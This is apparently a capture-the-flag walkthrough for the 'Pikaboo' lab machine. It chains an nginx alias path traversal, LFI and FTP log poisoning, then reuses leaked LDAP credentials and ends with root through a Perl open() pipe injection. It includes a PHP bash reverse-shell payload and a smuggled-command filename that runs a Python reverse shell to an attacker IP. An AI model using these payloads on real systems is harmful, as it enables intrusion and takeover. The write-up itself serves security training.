## Enumeration
-   21/tcp open ftp vsftpd 3.0.3
-   22/tcp open ssh OpenSSH 7.9p1p1 Debian 10+deb10u2 (protocol 2.0)
-   80/tcp open http nginx 1.14.2

## Web

We turn our attention to the "admin" tab on the webpage which is a page that requires basic authentication for logging in. However we don't know any and this is a hard box so it's unlikely that either guessing or brute-forcing will work. Clicking cancel on the basic authentication box gives us something interesting. 

We can see that it is saying it is using an Apache server on port 81 which makes us think why choose a non-standard port for apache? and nmap said there's nginx not apache so there must be some sort of traffic forwarding and reverse proxy running on the back-end. 

After checking versions for exploitation, we saw that the machine is running the latest versions of both Apache and Nginx, but we found [this article](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) that specified that there could be path traversal due to misconfigured alias in Nginx. So we thought to give it a try as it is pretty easy just go to the endpoint which asks for the credentials and then use ../ and then go to the desired directory.

```bash
ffuf -u http://10.10.10.249/admin../FUZZ -w big.txt -t 200
```

We have found few directories but most of them don’t look interesting except "server-status" which is mostly forbidden is now giving a 200 status code so let’s check that out.

We get a response on the web and we find some a couple of interesting lines 
```bash
127.0.0.1 localhost:81 GET /admin_staging HTTP/1.1
127.0.0.1 localhost:81 GET /pokatdex/etc/passwd HTTP/1.0
```

Now add the machine ip to /etc/hosts and navigate to `pikaboo.htb/admin../admin_staging/`

Now we notice that the URL seems to directly calling the PHP page of the respective web page so there could be potential LFI there. Using fuzzing we find some FTP logs that we can read through LFI. All of that gave us a user name `pwnmeow`

## Exploitation
Now that the road has cleared we can think of one thing: log poisoning.

For this to work we'll pass the payload as the "name" parameter on FTP (make sure to input a non-empty pass for it to work). We can trigger the shell by viewing the log `?page=/var/log/vsftpd.log`

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'"); ?>
```


## Filesystem enumeration
After some manual enumeration we find a cronjob scheduled by root
`* * * * * root /usr/local/bin/csvupdate_cron`

These are the contents:

```
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

After looking and analyzing the `/usr/local/bin/csvupdate` file - which is a perl script, and we turn our attention to the potentially exploitable open() function. The [exploit](https://stackoverflow.com/questions/26614348/perl-open-injection-prevention) basically is that if the filename starts with "|" then the rest of file name will be executed as command. However before we can create our payload we need login to ftp.

Let's enumerate the internal services
`ss -tunlp`

We find an interesting open listening port: `127.0.0.1:389` for LDAP services. 

Let's see what we can find with the given information `grep -iR "ldap" 2>/dev/null`

The search points to the ldap setting file at `opt/pokeapi/config/settings.py` which contains some hard-coded credentials. 

```bash
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
```

We have the LDAP creds and now let's further enumerate with the new acquired creds.

```bash
ldapsearch -D"cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b'dc=pikaboo,dc=htb' -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
```

```bash
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
```
With this we found base64 encoded ftp creds for the user 'pwnmeow'. Let's connect, move to a directory and put the malicious payload:

```bash
ftp> put hacker "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.16.3\",5555));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
```

Wait for the cronjob and we're root!